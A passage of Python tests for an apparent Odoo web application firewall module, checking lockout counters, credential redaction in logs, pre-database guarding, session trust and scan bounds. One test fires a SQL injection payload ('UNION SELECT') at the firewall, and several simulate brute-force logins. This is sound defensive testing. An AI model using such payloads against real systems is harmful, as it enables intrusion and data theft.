                                      "(10 failures in 30 min)",
                                      "learning")],
                             "exactly one would-lock-out note (no log "
                             "flood from failure #11)")
            r = self.url_open("/web/login", headers={"X-Real-IP": ip})
            self.assertEqual(r.status_code, 200,
                             "the whole site stays reachable in Learning")
        finally:
            self._dbwrite(lambda env: (
                env["waf.hit"].search([("ip", "=", ip)]).unlink(),
                env["waf.login.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.lockout.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.ip.entry"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.config"].get_singleton().write(
                    {"mode": "enforce"}),
            ))

    def _login_attempt(self, ip, login, password):
        """POST /web/session/authenticate over the real route (the same
        entry point the brief's live repro used)."""
        return self.url_open("/web/session/authenticate", data=json.dumps({
            "jsonrpc": "2.0", "method": "call", "id": 1,
            "params": {"db": self.env.cr.dbname, "login": login,
                       "password": password}}).encode(),
            headers={"Content-Type": "application/json",
                     "X-Real-IP": ip})

    def test_77_login_counter_inactive_when_waf_off(self):
        # review round 16 F02: mode "off" promised no counters (README
        # and the config wording) but authenticate counted anyway -- a
        # burst at login_fail_max still locked the network out. Off is
        # off: no shared row, no entry, no note.
        #
        # NB: off+max are pinned COMMITTED through _pinned_config, and
        # authenticate() (driven directly, test env) reads its own
        # get_singleton() -- which the helper re-points at that fresh
        # committed cursor. A test-env write of waf_config is impossible
        # in this rig (40001 at flush), same constraint test_08 carries.
        ip = "198.51.100.92"
        net = ip + "/32"
        with self._pinned_config(mode="off", login_fail_max=3):
            Users = self.env["res.users"].with_context(ip=ip)
            try:
                for i in range(4):
                    with self.assertRaises(Exception):
                        Users.authenticate(
                            {"type": "password", "login": "waf-brute-u77",
                             "password": "nope-%d" % i}, {})
                middleware.flush_hits()
                self.assertEqual(self._dbread(lambda env: (
                    env["waf.ip.entry"].search_count(
                        [("network", "=", net)]),
                    env["waf.login.hit"].search_count(
                        [("network", "=", net)]),
                    env["waf.hit"].search_count([("ip", "=", ip)]))),
                    (0, 0, 0), "off mode touches nothing")
            finally:
                self._dbwrite(lambda env: (
                    env["waf.hit"].search([("ip", "=", ip)]).unlink(),
                    env["waf.login.hit"].search(
                        [("network", "=", net)]).unlink(),
                    env["waf.ip.entry"].search(
                        [("network", "=", net)]).unlink()))

    def test_78_stored_query_redacts_credential_values(self):
        # review round 16 F03: waf.hit.query stored the raw
        # QUERY_STRING, so ?password=... landed verbatim in the traffic
        # log while the structured RPC context already strips
        # credentials. Rule matching keeps the raw query; only the
        # stored copy is sanitised -- values only, payload otherwise
        # byte-intact.
        ip = "203.0.116.77"
        try:
            r = self.url_open(
                "/?q=1%20UNION%20SELECT%201,2,3"
                "&password=LeakCheck123&master_pwd=S3cret-M9",
                headers={"X-Real-IP": ip})
            self.assertEqual(r.status_code, 403)  # the rule still bites
            middleware.flush_hits()
            queries = self._dbread(lambda env: [
                h.query or "" for h in env["waf.hit"].search(
                    [("ip", "=", ip)])])
            self.assertTrue(queries, "the SQLi hit is still logged")
            for q in queries:
                self.assertNotIn("LeakCheck123", q)
                self.assertNotIn("S3cret-M9", q)
                self.assertIn("password=[redacted]", q)
                self.assertIn("master_pwd=[redacted]", q)
                self.assertIn("UNION", q,
                              "the attack payload stays reviewable")
        finally:
            self._dbwrite(lambda env: env["waf.hit"].search(
                [("ip", "=", ip)]).unlink())

    def test_79_pre_db_guard_keeps_scanning_later_databases(self):
        # review round 16 F04: the pre-database loop returned at the
        # FIRST db with a snapshot but no matching apply_pre_db policy,
        # so a second db that DOES protect /web/database/* was never
        # consulted and the manager stayed reachable there. Two fake
        # registries are enough; the final fail-open return stays.
        fake = {
            "db_a": {"mode": "enforce", "trusted_networks": [],
                     "allow_entries": [], "deny_entries": [],
                     "policies": []},
            "db_b": {"mode": "enforce", "trusted_networks": [],
                     "allow_entries": [], "deny_entries": [],
                     "policies": [{
                         "apply_pre_db": True,
                         "regex": re.compile(r"^/web/database(?:/|$)"),
                         "methods": set(), "exempt": [],
                         "name": "db manager", "action": "block",
                         "severity": 5, "category": "endpoint"}]},
        }
        buffered = []
        with patch.object(middleware, "_loaded_dbs",
                          lambda: ["db_a", "db_b"]), \
             patch.object(middleware, "_get_snapshot", fake.__getitem__), \
             patch.object(middleware, "_buffer_hit",
                          lambda db, *_rest: buffered.append(db)):
            handled = middleware._pre_db_guard(
                {"PATH_INFO": "/web/database/manager",
                 "REQUEST_METHOD": "GET",
                 "REMOTE_ADDR": "203.0.113.9"}, None)
        self.assertTrue(
            callable(handled),
            "db_b's pre-db policy must fire after db_a abstains "
            "(before the fix: None, the manager stayed routable)")
        self.assertEqual(buffered, ["db_b"],
                         "the refusal and its hit belong to db_b")

    def test_80_session_trust_requires_the_session_own_db(self):
        # review round 17 F01: _resolve_db may lawfully land on a
        # database other than session.db (dbfilter rejects it and the
        # X-Odoo-Database header or the monodb fallback wins). A uid is
        # only an id in the SESSION's own res_users table: a session
        # from another database earned the no_session exemption here
        # anyway, because uid 2 is admin in EVERY database.
        admin = self.env.ref("base.user_admin").id
        path = "/web/dataset/call_kw"
        self.assertFalse(
            middleware._trusted_session(
                {"db": "some_other_db", "uid": admin}, path,
                self.env.cr.dbname),
            "a foreign-database session grants no exemption (before the "
            "fix: True, the uid was checked against the SELECTED db only)")
        self.assertTrue(
            middleware._trusted_session(
                {"db": self.env.cr.dbname, "uid": admin}, path,
                self.env.cr.dbname),
            "a same-database internal session keeps the exemption")

    def test_81_rate_key_uid_requires_the_session_own_db(self):
        # review round 17 F01: req["uid"] feeds engine._rate_key()'s
        # uid / ip_uid buckets. A foreign session's uid let an attacker
        # pose as a user OF THE SELECTED database: push that user's
        # bucket over its limit, or hide their own traffic behind a
        # uid key instead of the per-IP one. On a mismatch the request
        # must key exactly like an anonymous one.
        db = self.env.cr.dbname
        admin = self.env.ref("base.user_admin").id
        snap = middleware._get_snapshot(db)
        self.assertIsInstance(snap, dict)
        environ = {"PATH_INFO": "/web/dataset/search_read",
                   "REQUEST_METHOD": "GET",
                   "REMOTE_ADDR": "198.51.100.95"}
        req = middleware._extract(
            environ, snap, {"db": "some_other_db", "uid": admin}, db)
        self.assertNotIn(
            "uid", req,
            "a foreign-database session must not donate its uid to "
            "this database's rate keys (before the fix: it did)")
        req = middleware._extract(
            environ, snap, {"db": db, "uid": admin}, db)
        self.assertEqual(req.get("uid"), admin,
                         "a same-database session still keys by uid")

    def test_82_body_scan_max_is_bounded(self):
        # review round 17 F02: nothing bounded body_scan_max. At or
        # below the JSON chunk overlap (512) the chunker emitted ONE
        # scan candidate per decoded character; 0 silently became the
        # default; a negative value flowed through; an absurd value
        # made every request buffer that many bytes. The constraint
        # runs on a committed pooled cursor (a test-env write of
        # waf_config dies on 40001 at flush in this rig, see
        # _pinned_config); a rejected write rolls that cursor back,
        # so bad values provably never reach the database.
        try:
            for bad in (512, 0, -1, 2 * 1024 * 1024):
                with self.assertRaises(ValidationError):
                    self._dbwrite(lambda env: env["waf.config"]
                                  .get_singleton()
                                  .write({"body_scan_max": bad}))
            for good in (4096, 65536, 1048576):
                self._dbwrite(lambda env: env["waf.config"]
                              .get_singleton()
                              .write({"body_scan_max": good}))
                self.assertEqual(self._dbread(
                    lambda env: env["waf.config"]
                    .get_singleton().body_scan_max), good)
        finally:
            self._dbwrite(lambda env: env["waf.config"].get_singleton()
                          .write({"body_scan_max": 65536}))

    def test_83_json_chunks_never_step_below_half_a_window(self):
        # review round 17 F02 (independent of the config clamp):
        # _json_chunks cut candidates ``chunk - _JSON_CHUNK_OVERLAP``
        # characters apart -- with a window at or below 512 that step
        # was 1: one regex pass per character of the decoded body.
        # The step is now floored at half a window, keeping the
        # candidate count a small multiple of capture/chunk.
        body = json.dumps({"a": "x" * 200_000}).encode()
        chunks = middleware._json_chunks(body, 512)
        self.assertLessEqual(
            len(chunks), 2 * 200_000 // 512 + 2,
            "before the fix: ~200000 candidates (step was 1)")
        self.assertTrue(all(len(c) <= 512 for c in chunks))
        self.assertTrue(any("xxxx" in c for c in chunks),
                        "the walk still collects the strings")

    def test_84_learning_login_credit_never_reaches_enforce(self):
        # review round 17 F03: the worker-local login deque filled while
        # LEARNING survived a flip to Enforce, and in Enforce the deque
        # decides whenever _bump_lockout cannot reach the shared table
        # -- so the first store hiccup after the switch locked an IP out
        # on failures that were only ever meant to be NOTED (phantom
        # lockout). The attack counters got this isolation in 2.4.2
        # (middleware._credit_mode); the login layer now matches it.
        # NB: the two _pinned_config phases run SEQUENTIALLY -- nesting
        # them would break the helper (the inner fresh-env get_singleton
        # would hit the outer class-level patch).
        ip = "198.51.100.96"
        net = ip + "/32"
        try:
            with self._pinned_config(mode="learning", login_fail_max=3):
                Users = self.env["res.users"].with_context(ip=ip)
                for i in range(3):  # fills the learning deque
                    with self.assertRaises(Exception):
                        Users.authenticate(
                            {"type": "password", "login": "waf-brute-u84",
                             "password": "nope-%d" % i}, {})
            with self._pinned_config(mode="enforce", login_fail_max=3), \
                    patch.object(middleware, "_bump_lockout",
                                 lambda *a, **k: None):  # store outage
                with self.assertRaises(Exception):
                    Users.authenticate(
                        {"type": "password", "login": "waf-brute-u84",
                         "password": "nope-3"}, {})
            middleware.flush_hits()
            self.assertEqual(self._dbread(lambda env: (
                env["waf.ip.entry"].search_count(
                    [("network", "=", net), ("source", "=", "auto")]),
                env["waf.login.hit"].search_count(
                    [("network", "=", net)]))),
                (0, 0),
                "no phantom lockout through the fallback deque after a "
                "mode flip (before the fix: the 4th failure credited "
                "onto the stale learning deque -> auto deny entry)")
        finally:
            self._dbwrite(lambda env: (
                env["waf.hit"].search([("ip", "=", ip)]).unlink(),
                env["waf.login.hit"].search(
                    [("network", "=", net)]).unlink(),
                env["waf.ip.entry"].search(
                    [("network", "=", net)]).unlink()))

